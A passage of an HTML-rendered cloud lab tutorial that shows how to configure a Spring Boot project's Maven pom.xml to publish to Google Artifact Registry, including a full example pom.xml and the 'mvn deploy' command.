lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &lt;repositories&gt;</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &lt;repository&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &lt;id&gt;artifact-registry&lt;/id&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &lt;url&gt;artifactregistry://us-east1-maven.pkg.dev/qwiklabs-gcp-04-21a41c4e5c02/container-dev-java-repo&lt;/url&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &lt;releases&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &lt;enabled&gt;true&lt;/enabled&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &lt;/releases&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &lt;snapshots&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &lt;enabled&gt;true&lt;/enabled&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &lt;/snapshots&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &lt;/repository&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &lt;/repositories&gt;</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 293px;"></div><div class="CodeMirror-gutters" style="display: none; height: 293px;"></div></div></div></pre><p><span>Copied!</span></p><ul><li><p><span>Update the </span><strong><span>extensions in the Builds</span></strong><span> section.</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;extensions&gt;</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &lt;extension&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &lt;groupId&gt;com.google.cloud.artifactregistry&lt;/groupId&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &lt;artifactId&gt;artifactregistry-maven-wagon&lt;/artifactId&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &lt;version&gt;2.1.0&lt;/version&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &lt;/extension&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &lt;/extensions&gt;</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 158px;"></div><div class="CodeMirror-gutters" style="display: none; height: 158px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Here&#39;s an example of the complete file for your reference.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &lt;artifactId&gt;hello-world&lt;/artifactId&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &lt;packaging&gt;jar&lt;/packaging&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &lt;name&gt;Cloud Code Hello World&lt;/name&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &lt;description&gt;Getting started with Cloud Code&lt;/description&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &lt;version&gt;1.0.0&lt;/version&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;distributionManagement&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &lt;snapshotRepository&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &lt;id&gt;artifact-registry&lt;/id&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &lt;url&gt;artifactregistry://us-east1-maven.pkg.dev/qwiklabs-gcp-04-21a41c4e5c02/container-dev-java-repo&lt;/url&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &lt;/snapshotRepository&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &lt;repository&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &lt;id&gt;artifact-registry&lt;/id&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &lt;url&gt;artifactregistry://us-east1-maven.pkg.dev/qwiklabs-gcp-04-21a41c4e5c02/container-dev-java-repo&lt;/url&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &lt;/repository&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &lt;/distributionManagement&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &lt;repositories&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &lt;repository&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &lt;id&gt;artifact-registry&lt;/id&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &lt;url&gt;artifactregistry://us-east1-maven.pkg.dev/qwiklabs-gcp-04-21a41c4e5c02/container-dev-java-repo&lt;/url&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &lt;releases&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &lt;enabled&gt;true&lt;/enabled&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &lt;/releases&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &lt;snapshots&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &lt;enabled&gt;true&lt;/enabled&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &lt;/snapshots&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &lt;/repository&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &lt;/repositories&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &lt;parent&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &lt;version&gt;2.6.3&lt;/version&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &lt;/parent&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &lt;properties&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &lt;java.version&gt;1.8&lt;/java.version&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &lt;checkstyle.config.location&gt;./checkstyle.xml&lt;/checkstyle.config.location&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &lt;/properties&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &lt;build&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &lt;plugins&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &lt;plugin&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &lt;groupId&gt;com.google.cloud.tools&lt;/groupId&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &lt;artifactId&gt;jib-maven-plugin&lt;/artifactId&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &lt;version&gt;3.2.0&lt;/version&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &lt;/plugin&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &lt;plugin&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &lt;/plugin&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &lt;plugin&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &lt;artifactId&gt;maven-checkstyle-plugin&lt;/artifactId&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &lt;version&gt;3.1.2&lt;/version&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &lt;/plugin&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &lt;/plugins&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &lt;extensions&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &lt;extension&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &lt;groupId&gt;com.google.cloud.artifactregistry&lt;/groupId&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &lt;artifactId&gt;artifactregistry-maven-wagon&lt;/artifactId&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &lt;version&gt;2.1.0&lt;/version&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &lt;/extension&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &lt;/extensions&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &lt;/build&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &lt;!-- The Spring Cloud GCP BOM will manage spring-cloud-gcp version numbers for you. --&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &lt;dependencyManagement&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &lt;dependencies&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &lt;dependency&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &lt;artifactId&gt;spring-cloud-gcp-dependencies&lt;/artifactId&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &lt;version&gt;1.2.8.RELEASE&lt;/version&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &lt;type&gt;pom&lt;/type&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &lt;scope&gt;import&lt;/scope&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &lt;/dependency&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &lt;/dependencies&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &lt;/dependencyManagement&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &lt;dependencies&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &lt;dependency&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &lt;/dependency&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &lt;dependency&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &lt;artifactId&gt;spring-boot-starter-jetty&lt;/artifactId&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &lt;/dependency&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &lt;dependency&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &lt;/dependency&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &lt;dependency&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &lt;artifactId&gt;spring-boot-starter-thymeleaf&lt;/artifactId&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &lt;/dependency&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &lt;dependency&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &lt;scope&gt;test&lt;/scope&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &lt;/dependency&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &lt;dependency&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &lt;artifactId&gt;spring-cloud-gcp-starter-logging&lt;/artifactId&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &lt;/dependency&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &lt;/dependencies&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;/project&gt;</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 2768px;"></div><div class="CodeMirror-gutters" style="display: none; height: 2768px;"></div></div></div></pre><p><span>Copied!</span></p><h3 id='upload-your-java-package-to-artifact-registry'><span>Upload your Java package to Artifact Registry</span></h3><p><span>With Artifact Registry configured in Maven, you can now use Artifact Registry to store Java Jars for use by other projects in your organization.</span></p><ul><li><p><span>Enter the below command to change to </span><code>java-hello-world</code><span> folder.</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">cd ~/cloud-code-samples/java/java-hello-world</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ul><li><p><span>Run the following command to upload your Java package to Artifact Registry:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">mvn deploy</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; 